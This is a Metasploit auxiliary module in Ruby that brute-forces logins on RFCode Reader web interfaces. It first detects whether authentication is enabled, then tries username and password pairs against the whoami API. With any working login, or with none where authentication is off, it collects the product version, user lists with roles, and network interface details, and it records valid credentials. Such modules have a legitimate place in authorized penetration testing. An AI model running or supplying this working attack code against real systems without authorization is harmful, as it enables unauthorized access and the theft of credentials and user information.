##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'RFCode Reader Web Interface Login / Bruteforce Utility',
      'Description'    => %{
        This module simply attempts to login to a RFCode Reader web interface.
        Please note that by default there is no authentication. In such a case, password brute force will not be performed.
        If there is authentication configured, the module will attempt to find valid login credentials and capture device information.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'License'	 => MSF_LICENSE

    ))

    register_options(
      [
        OptBool.new('STOP_ON_SUCCESS', [ true, "Stop guessing when a credential works for a host", true])
      ], self.class)

  end

  #
  # Info-Only
  # Identify logged in user: /rfcode_reader/api/whoami.json
  # Capture list of users: /rfcode_reader/api/userlist.json
  # Interface configuration: /rfcode_reader/api/interfacestatus.json
  # Device platform details: /rfcode_reader/api/version.json
  #

  def run_host(ip)
    unless is_app_rfreader?
      print_error("#{rhost}:#{rport} - Application does not appear to be RFCode Reader. Module will not continue.")
      return
    end

    print_status("#{rhost}:#{rport} - Checking if authentication is required...")
    unless is_auth_required?
      print_warning("#{rhost}:#{rport} - Application does not require authentication.")
      user = ''
      pass = ''

      # Collect device platform & configuration info
      collect_info(user, pass)
      return
    end

    print_status("#{rhost}:#{rport} - Brute-forcing...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the app actually isn't RFCode Reader?
  #
  def is_app_rfreader?
    res = send_request_cgi(
      {
        'uri' => '/rfcode_reader/api/whoami.json',
        'vars_get' =>
          {
            '_dc' => '1369680704481'
          }
      })
    return (res and res.code != 404)
  end

  #
  # The default install of RFCode Reader app does not require authentication. Instead, it'll log the
  # user right in. If that's the case, no point to brute-force, either.
  #
  def is_auth_required?
    user = ''
    pass = ''

    res = send_request_cgi(
      {
        'uri'       => '/rfcode_reader/api/whoami.json',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass),
        'vars_get'	=>
          {
            '_dc' => '1369680704481'
          }
      })

    return (res and res.body =~ /{  }/) ? false : true
  end

  #
  # Brute-force the login page
  #
  def do_login(user, pass)

    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/rfcode_reader/api/whoami.json',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass),
        'vars_get'	=>
          {
            '_dc' => '1369680704481'
          }
      })

      if not res or res.code == 401
        vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}")
      else
        print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

        collect_info(user, pass)

        report_hash = {
          :host   => rhost,
          :port   => rport,
          :sname  => 'RFCode Reader',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'}

        report_auth_info(report_hash)
        return :next_user
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
      return :abort
    end
  end

  #
  # Collect target info
  #
  def collect_info(user, pass)

    vprint_status("#{rhost}:#{rport} - Collecting information from app as #{user.inspect}:#{pass.inspect}...")
    begin

      res = send_request_cgi(
      {
        'uri'       => '/rfcode_reader/api/version.json',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass),
        'vars_get'      =>
          {
            '_dc' => '1370460180056'
          }
      })

      if res and res.body
        release_ver = JSON.parse(res.body)["release"]
        product_name = JSON.parse(res.body)["product"]

        vprint_status("#{rhost}:#{rport} - Collecting device platform info...")
        vprint_good("#{rhost}:#{rport} - Release version: '#{release_ver}', Product Name: '#{product_name}'")

        report_note(
          :host   => rhost,
          :proto  => 'tcp',
          :port   => rport,
          :sname  => "RFCode Reader",
          :data   => "Release Version: #{release_ver}, Product: #{product_name}",
          :type	=> 'Info'
        )
      end

      res = send_request_cgi(
      {
        'uri'       => '/rfcode_reader/api/userlist.json',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass),
        'vars_get'      =>
          {
            '_dc' => '1370353972710'
          }
      })

      if res and res.body
        userlist = JSON.parse(res.body)
        vprint_status("#{rhost}:#{rport} - Collecting user list...")
        vprint_good("#{rhost}:#{rport} - User list & role: #{userlist}")

        report_note(
          :host   => rhost,
          :proto  => 'tcp',
          :port   => rport,
          :sname	=> "RFCode Reader",
          :data   => "User List & Roles: #{userlist}",
          :type	=> 'Info'
        )
      end

      res = send_request_cgi(
      {
        'uri'       => '/rfcode_reader/api/interfacestatus.json',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass),
        'vars_get'      =>
          {
            '_dc' => '1369678668067'
          }
      })

      if res and res.body
        eth0_info = JSON.parse(res.body)["eth0"]
        vprint_status("#{rhost}:#{rport} - Collecting interface info...")
        vprint_good("#{rhost}:#{rport} - Interface eth0 info: #{eth0_info}")

        report_note(
          :host	=> rhost,
          :proto	=> 'tcp',
          :port	=> rport,
          :sname	=> "RFCode Reader",
          :data	=> "Interface eth0: #{eth0_info}",
          :type	=> 'Info'
        )
      end

      return
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed while collecting info")
      return
    rescue JSON::ParserError
      vprint_error("#{rhost}:#{rport} - Unable to parse JSON response while collecting info")
      return
    end
  end
end
